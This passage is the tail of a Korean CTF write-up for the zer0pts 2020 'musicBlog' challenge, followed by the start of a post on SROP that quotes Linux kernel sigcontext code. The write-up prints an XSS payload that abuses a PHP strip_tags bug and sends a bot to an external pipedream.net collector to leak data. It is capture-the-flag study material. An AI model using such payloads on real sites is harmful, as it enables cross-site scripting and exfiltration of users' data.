src=\"/static/77f87ef0b690582030395c32afb73b29/37523/6.png\"\n        srcset=\"/static/77f87ef0b690582030395c32afb73b29/e9ff0/6.png 180w,\n/static/77f87ef0b690582030395c32afb73b29/f21e7/6.png 360w,\n/static/77f87ef0b690582030395c32afb73b29/37523/6.png 720w,\n/static/77f87ef0b690582030395c32afb73b29/dd104/6.png 1064w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li><code class=\"language-text\">strip_tags</code> 관련 bug를 확인하면 만약 <code class=\"language-text\">&lt;strong></code> 태그를 화이트리스트에 존재할 경우 <code class=\"language-text\">&lt;s/trong></code> 구문도 그대로 복사되어 유지되는 모습을 확인할 수 있다.</li>\n</ul>\n<h2 id=\"php-bug-테스트\" style=\"position:relative;\"><a href=\"#php-bug-%ED%85%8C%EC%8A%A4%ED%8A%B8\" aria-label=\"php bug 테스트 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>PHP Bug 테스트</h2>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 42.77777777777778%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAIAAAC9o5sfAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAgklEQVQoz52RMQ7DMAhFff9b9QzdqnRMh05Jaj42UKhQOnVo5DwhFvTER5T5MU/TnYCI8BijrNu2LKuq+jilg3OjxxlZupiamXn6A5WxwcytMTf3sZNzc5wlZRPUCiIQoF9s70fJvVxuZB2V0kfekADcuxy/6vrcM/wOVOWFt9g/+QPX0BVomSYa7gAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./7.png\"\n        title=\"./7.png\"\n        src=\"/static/7176eb6e8e1466dc2fe2939a62052251/37523/7.png\"\n        srcset=\"/static/7176eb6e8e1466dc2fe2939a62052251/e9ff0/7.png 180w,\n/static/7176eb6e8e1466dc2fe2939a62052251/f21e7/7.png 360w,\n/static/7176eb6e8e1466dc2fe2939a62052251/37523/7.png 720w,\n/static/7176eb6e8e1466dc2fe2939a62052251/302a4/7.png 1080w,\n/static/7176eb6e8e1466dc2fe2939a62052251/e6c84/7.png 1148w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 27.22222222222222%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAIAAADKYVtkAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA+UlEQVQY003Oy0rDQBgF4LyHpSmZS2by556OCVXbgltfUxDBh3DhptRFM1GRCnapmLQBN7V1JpJIoYez/TjHKKtqPpst5o/vq9VCyq+yarpImbux8MQoGKbcjxzOAYAyjhHChxg7pb/Xa12VrdC6aRqlVIvz3PF8EGc8iAGA2RRhbLWSHCwxtvWmflvuPz90vdHd5j8uCmkTxAD8ME5c5tiE2xQ4oxgRjCglBFnG7/L15/Z6e3eze7hvjrAsni0nHnjCyS7jbBIkKYgLJsYDHpk8MiExWWi0V5Vqq9Uxzp9eTDfrh2P7/MpNp2Q46fujEy56kPbgtGv6BwvrmZZg02ffAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./8.png\"\n        title=\"./8.png\"\n        src=\"/static/f27b347e989ad6f4b10507ab9482f67c/37523/8.png\"\n        srcset=\"/static/f27b347e989ad6f4b10507ab9482f67c/e9ff0/8.png 180w,\n/static/f27b347e989ad6f4b10507ab9482f67c/f21e7/8.png 360w,\n/static/f27b347e989ad6f4b10507ab9482f67c/37523/8.png 720w,\n/static/f27b347e989ad6f4b10507ab9482f67c/8bd7c/8.png 845w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li><code class=\"language-text\">&lt;audio></code> 태그 부분에 <code class=\"language-text\">/</code> 을 입력하여 <code class=\"language-text\">strip_tags</code> 메서드 버그로 인하여 다음과 같이</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"html\"><pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>a</span> <span class=\"token attr-name\">udio</span><span class=\"token punctuation\">></span></span>PHP BUG<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>a</span><span class=\"token punctuation\">></span></span></code></pre></div>\n<ul>\n<li><code class=\"language-text\">a</code> 태그 로 인식하게되어 우회가 가능하다. 그렇다면 a태그를 사용하여 외부 서버로 요청을 보내게 되면 <code class=\"language-text\">user-agent</code> 헤더 부분을 읽을 수 있지 않을까?</li>\n<li>그렇다면 앞에서 분석해본 <code class=\"language-text\">work.js</code> 에서는 <code class=\"language-text\">newPage()</code> 메서드를 통해 생성을 한 후에 <code class=\"language-text\">UserAgent</code>를 바탕으로 적용을 한후 <code class=\"language-text\">id: like</code> 이벤트가 발생하였을 경우 적용된 resource를 받을 수 있기 때문에 페이로드를 짤때 <code class=\"language-text\">id</code> 값을 like로 적용을 한 후에 보내야 한다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"html\"><pre class=\"language-html\"><code class=\"language-html\">&lt;a/udio href=\"https://11973bb238cad6a84c369c6b0060ed0b.m.pipedream.net\" id=\"like\">\n\t EXPLOIT &lt;/a/udio></code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 40.55555555555556%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAIAAAB2/0i6AAAACXBIWXMAAAsTAAALEwEAmpwYAAAAqklEQVQY05WOUQoCMQxEe/8jeAUP4o+wRxAXdz9d2zRNmrSJuIIoiLjDI8zPTCacx3Ga58s0E7G72xYCEXVt/sjZJswsABKTiDRtpt3/RLp387Ckkm4RACFCvMa0xOeFW0xLykiZai6MuchbuzSvzQOtk7fKfA2bqahCkUyCrKz2oq71X2H1qhb2Aw+nxAViggyAiGUVliKiv/+H3dEP48N1+xxmxlXpZ/wOYVzWF7Lh9jYAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./9.png\"\n        title=\"./9.png\"\n        src=\"/static/5925085382a019bef00f6cfb3c7e5a10/37523/9.png\"\n        srcset=\"/static/5925085382a019bef00f6cfb3c7e5a10/e9ff0/9.png 180w,\n/static/5925085382a019bef00f6cfb3c7e5a10/f21e7/9.png 360w,\n/static/5925085382a019bef00f6cfb3c7e5a10/37523/9.png 720w,\n/static/5925085382a019bef00f6cfb3c7e5a10/302a4/9.png 1080w,\n/static/5925085382a019bef00f6cfb3c7e5a10/33d1d/9.png 1150w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 598px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 21.111111111111114%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAIAAAABPYjBAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAr0lEQVQI13XOwRKCIBRAUb8kBVLAtMmKeKipQT7CpkWLZvr/L2li1aazvKub5FzksuSilKKoOatK0Sgtqm26WtF1zrjI0jT7QUhGIkppcmrP/TVM84J2cuPQt2C6vj0PxhgDYAC6rgMArTVER6WVUlodmmafTNY9X+9wf9jbPSzLHCHO3ntERO9DCIgY45d1V2fdbC/DOCa82srdUZRVLYtCynxTE0LJfzQOE0oZYx9ewC8bv/jsXQAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./10.png\"\n        title=\"./10.png\"\n        src=\"/static/f42b5fa9b65c2792c3586823a8f9b852/0c69d/10.png\"\n        srcset=\"/static/f42b5fa9b65c2792c3586823a8f9b852/e9ff0/10.png 180w,\n/static/f42b5fa9b65c2792c3586823a8f9b852/f21e7/10.png 360w,\n/static/f42b5fa9b65c2792c3586823a8f9b852/0c69d/10.png 598w\"\n        sizes=\"(max-width: 598px) 100vw, 598px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h2 id=\"response-event-확인\" style=\"position:relative;\"><a href=\"#response-event-%ED%99%95%EC%9D%B8\" aria-label=\"response event 확인 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>response Event 확인</h2>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 46.666666666666664%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAIAAAC9o5sfAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAxElEQVQoz5WP247FIAhF+/9/WquAtiog2ok9t3mYnGY2hBDCCpslpR0pVhYVbSyNxfqw3p916lP7jKvpfYyxqCoCgduKcw2pxWi1GLMxd7PxVYuoElL1gddVVqcA4r14r4BKZLkoRSt1nOcfsKoCEsYkPjSiufReu7x9u6xywRTrvivznE3+lTewagiQiPLms9skhJazlWKldJEb2JoFgADIiA2gHYcJT7jWLnoDswgGjDHV/Zinfnu+tR1TKkc+H6/+Uz/KchA+98mR2QAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./11.png\"\n        title=\"./11.png\"\n        src=\"/static/806732ee76eb47722ae809c7b3674d74/37523/11.png\"\n        srcset=\"/static/806732ee76eb47722ae809c7b3674d74/e9ff0/11.png 180w,\n/static/806732ee76eb47722ae809c7b3674d74/f21e7/11.png 360w,\n/static/806732ee76eb47722ae809c7b3674d74/37523/11.png 720w,\n/static/806732ee76eb47722ae809c7b3674d74/bf433/11.png 971w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>응답 결과 헤더 라인에 user-agent 속성에서 FLAG 값을 확인할 수 있다.</li>\n</ul>\n<div class=\"table-of-contents\">\n<ul>\n<li><a href=\"#dockerfile-%EB%B6%84%EC%84%9D\">DockerFile 분석</a></li>\n<li><a href=\"#flag-%EB%AC%B8%EC%9E%90%EC%97%B4-%EC%B0%BE%EA%B8%B0\">flag 문자열 찾기</a></li>\n<li><a href=\"#samplepage\">SamplePage</a></li>\n<li><a href=\"#postphp-%EB%B6%84%EC%84%9D\">post.php 분석</a></li>\n<li><a href=\"#utilphp-%EB%B6%84%EC%84%9D\">util.php 분석</a></li>\n<li><a href=\"#strip_tags-allows--in-tag-name-allowing-whitelist-bypass-in-browsers\">strip_tags allows / in tag name, allowing whitelist bypass in browsers</a></li>\n<li><a href=\"#php-bug-%ED%85%8C%EC%8A%A4%ED%8A%B8\">PHP Bug 테스트</a></li>\n<li><a href=\"#response-event-%ED%99%95%EC%9D%B8\">response Event 확인</a></li>\n</ul>\n</div>","frontmatter":{"date":"August 24, 2020","title":"zer0pts ctf 2020 - musicBlof 취약점 분석","categories":"CTF","author":"Zer0Luck","emoji":"🥓"},"fields":{"slug":"/zer0pts_music_ctf_writeup/"}},"prev":{"id":"7aa9785d-9403-57d9-97d5-658045915602","html":"<h1 id=\"취약점-분석\" style=\"position:relative;\"><a href=\"#%EC%B7%A8%EC%95%BD%EC%A0%90-%EB%B6%84%EC%84%9D\" aria-label=\"취약점 분석 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>취약점 분석</h1>\n<blockquote>\n<p>SROP</p>\n<ul>\n<li>\n<p>리눅스에서는 시그널이 들어오게 되면 커널 모드에서 처리한다.</p>\n</li>\n<li>\n<p>커널 모드에서 유저모드로 들어오는 과정에서 유저의 스택에 레지스터 정보들을 저장해 놓는다.</p>\n</li>\n<li>\n<p><code class=\"language-text\">rt_sigreturn</code> 은 이렇게 저장해놓은 정보들을 다시 돌려놓을 때 사용된다.</p>\n</li>\n<li>\n<p>공격자가 <code class=\"language-text\">rt_sigreturn</code> 시스템 콜을 호출할 수 있고 스택을 조작할 수 있다면 모든 레지스터와 > 세그먼트를 조작할 수 있다.</p>\n</li>\n<li>\n<p><code class=\"language-text\">rt_sigreturn</code> 시스템 콜을 사용하여 익스폴로잇 하는 기법을 SigReturn Oriented Programming > (SROP)라고 한다.</p>\n</li>\n</ul>\n</blockquote>\n<h2 id=\"restore_sigcontext\" style=\"position:relative;\"><a href=\"#restore_sigcontext\" aria-label=\"restore_sigcontext permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>restore_sigcontext</h2>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token keyword\">static</span> <span class=\"token keyword\">int</span> <span class=\"token function\">restore_sigcontext</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">struct</span> <span class=\"token class-name\">pt_regs</span> <span class=\"token operator\">*</span>regs<span class=\"token punctuation\">,</span>\n\t\t\t      <span class=\"token keyword\">struct</span> <span class=\"token class-name\">sigcontext</span> __user <span class=\"token operator\">*</span>sc<span class=\"token punctuation\">,</span>\n\t\t\t      <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> uc_flags<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">{</span>\n\t<span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> buf_val<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">void</span> __user <span class=\"token operator\">*</span>buf<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> tmpflags<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> err <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token comment\">/* Always make any pending restarted system calls return -EINTR */</span>\n\tcurrent<span class=\"token operator\">-></span>restart_block<span class=\"token punctuation\">.</span>fn <span class=\"token operator\">=</span> do_no_restart_syscall<span class=\"token punctuation\">;</span>\n\tget_user_try <span class=\"token punctuation\">{</span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">ifdef</span> <span class=\"token expression\">CONFIG_X86_32</span></span>\n\t\t<span class=\"token function\">set_user_gs</span><span class=\"token punctuation\">(</span>regs<span class=\"token punctuation\">,</span> <span class=\"token function\">GET_SEG</span><span class=\"token punctuation\">(</span>gs<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">COPY_SEG</span><span class=\"token punctuation\">(</span>fs<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">COPY_SEG</span><span class=\"token punctuation\">(</span>es<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">COPY_SEG</span><span class=\"token punctuation\">(</span>ds<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">endif</span> <span class=\"token comment\">/* CONFIG_X86_32 */</span></span>\n\t\t<span class=\"token function\">COPY</span><span class=\"token punctuation\">(</span>di<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token function\">COPY</span><span class=\"token punctuation\">(</span>si<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token function\">COPY</span><span class=\"token punctuation\">(</span>bp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token function\">COPY</span><span class=\"token punctuation\">(</span>sp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token function\">COPY</span><span class=\"token punctuation\">(</span>bx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">COPY</span><span class=\"token punctuation\">(</span>dx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token function\">COPY</span><span class=\"token punctuation\">(</span>cx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token function\">COPY</span><span class=\"token punctuation\">(</span>ip<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token function\">COPY</span><span class=\"token punctuation\">(</span>ax<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">ifdef</span> <span class=\"token expression\">CONFIG_X86_64</span></span>\n\t\t<span class=\"token function\">COPY</span><span class=\"token punctuation\">(</span>r8<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">COPY</span><span class=\"token punctuation\">(</span>r9<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">COPY</span><span class=\"token punctuation\">(</span>r10<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">COPY</span><span class=\"token punctuation\">(</span>r11<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">COPY</span><span class=\"token punctuation\">(</span>r12<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">COPY</span><span class=\"token punctuation\">(</span>r13<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">COPY</span><span class=\"token punctuation\">(</span>r14<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">COPY</span><span class=\"token punctuation\">(</span>r15<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n         <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<ul>\n<li><code class=\"language-text\">COPY</code>, <code class=\"language-text\">COPY_SEG</code> 매크로를 사용하여 레지스터및 세그먼트를 복원한다.</li>\n</ul>\n<h2 id=\"sigcontext-32bit\" style=\"position:relative;\"><a href=\"#sigcontext-32bit\" aria-label=\"sigcontext 32bit permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>sigcontext-32bit</h2>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token keyword\">struct</span> <span class=\"token class-name\">sigcontext</span>\n<span class=\"token punctuation\">{</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">short</span> gs<span class=\"token punctuation\">,</span> gsh<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">short</span> fs<span class=\"token punctuation\">,</span> fsh<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">short</span> es<span class=\"token punctuation\">,</span> esh<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">short</span> ds<span class=\"token punctuation\">,</span> dsh<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> edi<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> esi<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> ebp<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> esp<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> ebx<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> edx<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> ecx<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> eax<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> trapno<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> err<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> eip<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">short</span> cs<span class=\"token punctuation\">,</span> __csh<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> eflags<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> esp_at_signal<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">short</span> ss<span class=\"token punctuation\">,</span> __ssh<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">struct</span> <span class=\"token class-name\">_fpstate</span> <span class=\"token operator\">*</span> fpstate<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> oldmask<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> cr2<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span></code></pre></div>\n<h2 id=\"sigcontext-64bit\" style=\"position:relative;\"><a href=\"#sigcontext-64bit\" aria-label=\"sigcontext 64bit permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>sigcontext-64bit</h2>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token keyword\">struct</span> <span class=\"token class-name\">sigcontext</span>\n<span class=\"token punctuation\">{</span>\n  __uint64_t r8<span class=\"token punctuation\">;</span>\n  __uint64_t r9<span class=\"token punctuation\">;</span>\n  __uint64_t r10<span class=\"token punctuation\">;</span>\n  __uint64_t r11<span class=\"token punctuation\">;</span>\n  __uint64_t r12<span class=\"token punctuation\">;</span>\n  __uint64_t r13<span class=\"token punctuation\">;</span>\n  __uint64_t r14<span class=\"token punctuation\">;</span>\n  __uint64_t r15<span class=\"token punctuation\">;</span>\n  __uint64_t rdi<span class=\"token punctuation\">;</span>\n  __uint64_t rsi<span class=\"token punctuation\">;</span>\n  __uint64_t rbp<span class=\"token punctuation\">;</span>\n  __uint64_t rbx<span class=\"token punctuation\">;</span>\n  __uint64_t rdx<span class=\"token punctuation\">;</span>\n  __uint64_t rax<span class=\"token punctuation\">;</span>\n  __uint64_t rcx<span class=\"token punctuation\">;</span>\n  __uint64_t rsp<span class=\"token punctuation\">;</span>\n  __uint64_t rip<span class=\"token punctuation\">;</span>\n  __uint64_t eflags<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">short</span> cs<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">short</span> gs<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">short</span> fs<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">short</span> pad0<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">uint64_t</span> err<span class=\"token punctuation\">;</span>\n  __uint64_t trapno<span class=\"token punctuation\">;</span>\n  __uint64_t oldmask<span class=\"token punctuation\">;</span>\n  __uint64_t cr2<span class=\"token punctuation\">;</span>\n  extension <span class=\"token keyword\">union</span>\n    <span class=\"token punctuation\">{</span>\n      <span class=\"token keyword\">struct</span> <span class=\"token class-name\">_fpstate</span> <span 